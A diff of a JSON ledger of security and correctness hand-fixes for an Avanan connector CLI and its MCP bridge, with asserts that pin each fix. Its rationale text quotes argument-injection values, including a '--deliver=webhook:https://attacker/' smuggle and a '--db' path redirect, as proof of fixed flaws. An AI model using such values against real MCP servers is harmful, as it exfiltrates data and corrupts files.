@@ -5,14 +5,14 @@
  "handfixes": [
   {
    "id": "x-text-above-go-2026-5970",
-   "summary": "`golang.org/x/text` is pinned at v0.41.0, above the v0.39.0 fix for GO-2026-5970",
+   "summary": "`golang.org/x/text` is pinned at v0.42.0, above the v0.39.0 fix for GO-2026-5970",
    "why": "The press emits `golang.org/x/text v0.14.0` as an indirect dependency of modernc.org/sqlite. Every version below v0.39.0 carries GO-2026-5970 (CVE-2026-56852): a norm.Iter infinite loop on input containing invalid UTF-8 bytes. Because a new connector's go.mod counts as introducing every version in it, the repo security gate scores that advisory P1 and blocks the merge. A reprint from a press that still emits v0.14.0 reintroduces the P1.",
    "status": "active",
    "spec_encode_followup": "Raise the floor on golang.org/x/text in the press module template so generated go.mod files ship above the GO-2026-5970 fix by construction (filed as a retro item against the generator).",
    "asserts": [
     {
      "file": "cli/go.mod",
-     "contains": "golang.org/x/text v0.41.0",
+     "contains": "golang.org/x/text v0.42.0",
      "min_count": 1
     },
     {
@@ -434,7 +434,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -456,6 +456,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -559,55 +589,6 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
    "id": "notice-carries-the-contributor-credit",
    "summary": "cli/NOTICE names this connector's contributor, in the Apache-2.0 attribution channel",
    "why": "CONTRIBUTING.md and the public contributing page promise that a contributor's credit survives a regeneration. Nothing enforced that. The press regenerates cli/NOTICE from its own template, which carries the CLI Printing Press attribution but not this repo's per-connector 'contributed by' sentence, so a reprint would silently delete the only place the credit lives. PR #283 moved contributor credit out of per-file copyright headers and into NOTICE, which makes this line the load-bearing copy rather than a duplicate. Pinning the exact sentence here is what turns the promise into a checked one.",
@@ -667,102 +648,6 @@
    ]
   },
   {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "mcp-recipe-argv-not-flag-like",
-   "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. (1 guarded call site(s); the ledger requires all of them.)",
-   "why": "Found by Codex adversarial review of the fleet mcp-argv-value-joined backport (2026-09-09): the recipe path had the same key-only gap. A recipe positional is appended to argv AHEAD of the recipe's own flags, so {\"domain\": \"--deliver=webhook:https://attacker/\"} became `exceptions find --deliver=webhook:... --agent` and pflag parsed the value as the denylisted root flag (and {\"domain\": \"--dry-run\"} demonstrably changed execution). The split appendRecipeStringFlag branch was safe only because its one caller's flag is a string flag that consumes the next token; a future NoOptDefVal flag would reopen it. Upstream cli-printing-press be378adf (#4647) fixed cliArgsFromMCP but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Mirrors cobratree.validatePositionalArgsForMCP, which already applies this rule to the raw args field. Retire only when the press generator refuses flag-like recipe positionals itself.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "return append(args, \"--\"+name+\"=\"+selected), false",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "not_contains": "\"--\"+name, selected"
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "func rejectFlagLikeRecipeValue(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "if err := rejectFlagLikeRecipeValue(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/recipe_intents_test.go",
-     "contains": "RejectsFlagLikePositional(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/intents.go",
-     "contains": "if s := recipeValueString(value); s != \"-\" && strings.HasPrefix(s, \"-\") {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/recipe_intents_test.go",
-     "contains": "func TestRejectFlagLikeRecipeValueEdges(",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
    "id": "mcp-executor-request-contracts",
    "summary": "MCP discovery exposes executor-facing request schemas and indexes input names and known enum values",
    "why": "Issue #351: endpoint summaries omitted required request inputs. Keep canonical JSON body case and nesting, path/header/query routing, and exact short request search terms. Contracts are derived from the shipped CLI source, and the existing CLI commands and auth remain intact. Upstream request metadata fix #4890 was not merged when this surgical repair was made.",
@@ -808,12 +693,12 @@
    "asserts": [
     {
      "file": "cli/internal/mcp/tools.go",
-     "contains": "if err := client.InstallAvananAuth(c); err != nil {",
+     "contains": "if err := cli.ApplyClientHooks(c); err != nil {",
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/tools.go",
-     "contains": "installing Avanan MCP authentication: %w",
+     "file": "cli/internal/cli/avanan_client_hook.go",
+     "contains": "registerClientHook(client.InstallAvananAuth)",
      "code_only": true
     },
     {
@@ -824,92 +709,6 @@
     {
      "file": "cli/internal/mcp/request_contract_test.go",
      "contains": "Avanan signing transport was bypassed"
-    }
-   ]
-  },
-  {
-   "id": "windows-sddl-alias-sid-compare",
-   "summary": "the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials",
-   "why": "Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.",
-   "status": "active",
-   "spec_encode_followup": "Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "func trusteeSID(trustee string, resolveAlias sddlAliasResolver) string {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if om == nil || !sidAllowed(trusteeSID(om[1], resolveAlias), currentUserSID) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !sidAllowed(trusteeSID(trustee, resolveAlias), currentUserSID) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "contains": "return evalCredsSecurityResolved(sd.String(), me, resolveSDDLAlias)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "contains": "sid, err := windows.StringToSid(alias)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "not_contains": "return evalCredsSecurity(sd.String(), me)"
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityResolvesSDDLAliases(t *testing.T) {",
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "windows-null-dacl-behind-flags",
-   "summary": "the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped",
-   "why": "Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.",
-   "status": "active",
-   "spec_encode_followup": "Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if strings.Contains(daclFlags, \"NO_ACCESS_CONTROL\") {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !daclFlagsRe.MatchString(daclFlags) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !aceListRe.MatchString(rest[flagsEnd:]) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if len(fields) != 6 {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "not_contains": "if strings.HasPrefix(rest, \"NO_ACCESS_CONTROL\") {"
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityRefusesNullDACLBehindFlags(t *testing.T) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityChecksTheDACLSectionFraming(t *testing.T) {",
-     "code_only": true
     }
    ]
   },
@@ -932,87 +731,6 @@
     {
      "file": "cli/internal/cli/create_alias_destructive_test.go",
      "contains": "func TestDestructiveCommandsDoNotAnswerToCreate(",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md, README.md and page.json carry the interim security note and pause the remote-agent recipe (stdio-to-HTTP bridge launch line commented out, no tunnel step) until this connector is reprinted.",
-   "why": "Docs-only interim fix ratified 2026-10-22 (follow-up to #428). This connector is stdio-only, so the remote-agent recipe put it behind a supergateway bridge that adds no password: anyone who can reach the bridge's port can use the MCP tools with the stored credentials. The docs must not tell anyone to run the bridge or tunnel it. mcp-install.md and README.md are regenerated by msp-skills-publish onboard.py (gen_mcp_install, render_readme); this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "### Does this work with ChatGPT?\n\nNot with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "\"a\": \"Not with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "README.md",
-     "not_contains": "via the `supergateway` bridge"
-    },
-    {
-     "file": "page.json",
-     "not_contains": "via a secure bridge"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: blockedStructuredArgsForCommand (press 4.27 to 4.30.2) now blocks every destination flag and every mcp:write-flags declaration, local or inherited, so the flag is left out of the tool schema and validateMCPArgumentNames refuses a call that supplies it by name; before, local destination flags were advertised and cliArgsFromMCP dropped them silently",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: blockedStructuredArgsForCommand (press 4.27 to 4.30.2) now blocks every destination flag and every mcp:write-flags declaration, local or inherited, so the flag is left out of the tool schema and validateMCPArgumentNames refuses a call that supplies it by name; before, local destination flags were advertised and cliArgsFromMCP dropped them silently. The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "blockDestination := func(flag *pflag.Flag) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "for name := range flagWriteSinkNames(cmd) {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
      "min_count": 1,
      "code_only": true
     }
@@ -1043,6 +761,1210 @@
      "not_contains": "%s-pp-cli"
     }
    ]
+  },
+  {
+   "id": "msp-fleet-reads-documented-tenant-shape",
+   "class": "wrong-result",
+   "summary": "msp fleet reads the msp-tenants sync partition in the documented Tenant shape, so seat counts and the over-seat filter work",
+   "why": "msp fleet read the `msp` sync partition (usage rows on 4.30.2, MSP partners on 4.34.0) and seat keys the API never sends, so every tenant showed 0 seats and --over-seats-only could never fire. It now reads msp-tenants with maxLicensedUsers, users, package and status, keeping every earlier key as a fallback.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/avanan_msp_fleet.go",
+     "contains": "const mspTenantsResource = \"msp-tenants\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_msp_fleet.go",
+     "contains": "intField(t.Obj, \"maxLicensedUsers\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_msp_fleet.go",
+     "contains": "intField(t.Obj, \"users\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msp_fleet_test.go",
+     "contains": "func TestNovelMspFleetReadsDocumentedTenantShape(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-shipped-base-url-is-not-a-placeholder",
+   "class": "doctor",
+   "summary": "doctor treats the real default gateway as configured, not as a placeholder",
+   "why": "doctorShippedBaseURL held the real US gateway, so doctor called every healthy US install unconfigured and skipped the credential probe.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict_test.go",
+     "contains": "func TestDoctorAcceptsTheRealDefaultGateway(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "vacuum-into-uses-a-bound-parameter",
+   "class": "generated-file-edit",
+   "summary": "the store backup runs VACUUM INTO with the target path bound as a parameter",
+   "why": "Carried from the shipped tree (present but unrecorded): the path is bound, never concatenated into the SQL text.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "VACUUM INTO ?",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "VACUUM INTO '\"+quotedTarget"
+    }
+   ]
+  },
+  {
+   "id": "auth-set-token-ported",
+   "class": "auth-wire",
+   "summary": "`auth set-token <app-id>` is kept as a hand file",
+   "why": "Press 4.34.0 emits no set-token for an API needing three credential inputs; the shipped avanan_auth.go hook registers newAuthSetTokenCmd, which saves the application ID through SaveCredential.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/avanan_set_token.go",
+     "contains": "func newAuthSetTokenCmd(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "action-wait-observes-the-task",
+   "class": "wrong-result",
+   "summary": "`action post-entity` / `post-event --wait` poll every task in responseData[] and fail closed without one",
+   "why": "Avanan nests taskId inside responseData[]; the generated --wait read a top-level taskId, never polled and exited 0. The generated files call the hand-written avananActionWait, which polls every task and exits 8 when a target has no task or is not terminal, 5 on a terminal failure.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/action_post-entity.go",
+     "contains": "// Hand-fix (action-wait-observes-the-task)",
+     "min_count": 1,
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/action_post-event.go",
+     "contains": "// Hand-fix (action-wait-observes-the-task)",
+     "min_count": 1,
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/avanan_action_wait.go",
+     "contains": "func avananTaskIDs(data []byte) (ids, untasked []string, err error)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_r1_test.go",
+     "contains": "func TestActionWaitFailsClosedWithoutATaskID(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-login-output-is-credential-free",
+   "class": "secret-exposed",
+   "summary": "`auth login` output is an allowlist struct with no credential field",
+   "why": "auth login --json printed the application ID; the result struct now carries no credential.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/avanan_review_r1_test.go",
+     "contains": "func TestAuthLoginNeverPrintsTheApplicationID(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "avanan-handshake-is-guarded",
+   "class": "secret-echo",
+   "summary": "the token handshake runs on the guarded path: no plaintext to a non-loopback host, no redirect, no vendor body in errors",
+   "why": "The handshake ran on its own http.Client, so plaintext http and a replayed redirect could carry the access key, and handshake errors echoed the vendor body. One guarded path now refuses plaintext whenever the transport holds any credential, refuses every redirect, and reports only status plus a fixed diagnostic. A failed handshake envelope is not a token.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/client/avanan_transport.go",
+     "contains": "plaintextCredentialError",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/avanan_transport_review_test.go",
+     "contains": "func TestHandshakeNeverFollowsARedirect(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/avanan_transport_review_test.go",
+     "contains": "func TestHandshakeErrorNeverEchoesTheVendorBody(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "envelope-failure-is-not-success",
+   "class": "wrong-result",
+   "summary": "an HTTP 2xx whose responseEnvelope.responseCode fails is reported as a failure",
+   "why": "Avanan answers HTTP 200 with a failing responseEnvelope.responseCode; commands and the MCP executor printed success. The transport rewrites such a response to the vendor status; client.EnvelopeCodeFailed is the one rule, shared with avananmirror.Decode. Next-batch Codex review round 1, P2: the envelope was read from the compressed bytes of a gzip answer, so a gzip 200 whose envelope failed was a success; applyEnvelopeStatus now reads the body inflated() decodes, the same step the ingress credential check uses.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/client/avanan_transport.go",
+     "contains": "func EnvelopeCodeFailed(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/avanan_transport_review_test.go",
+     "contains": "func TestEnvelopeFailureIsNotAnHTTPSuccess(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/avanan_transport.go",
+     "contains": "body = inflated(resp, body)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "remediate-refuses-without-yes",
+   "class": "write-safety",
+   "summary": "`remediate` refuses without --yes and confirms a restore only by evidence",
+   "why": "remediate is mirrored as an MCP tool and the bridge never forwards --yes, so it quarantined or restored with no confirmation. It now refuses before building a client; --dry-run previews. A restore counts as applied only on isRestored or a quarantined to not-quarantined transition.",
+   "status": "active",
+   "spec_encode_followup": "None: connector behavior in hand-written code or a re-applied generated edit (press 4.34.0 reprint review).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/avanan_review_r1_test.go",
+     "contains": "func TestRemediateRefusesWithoutYes(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/avanan_review_r1_test.go",
+     "contains": "func TestRestoreIsNotConfirmedWithoutEvidence(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mirror-completeness-fails-closed",
+   "class": "wrong-result",
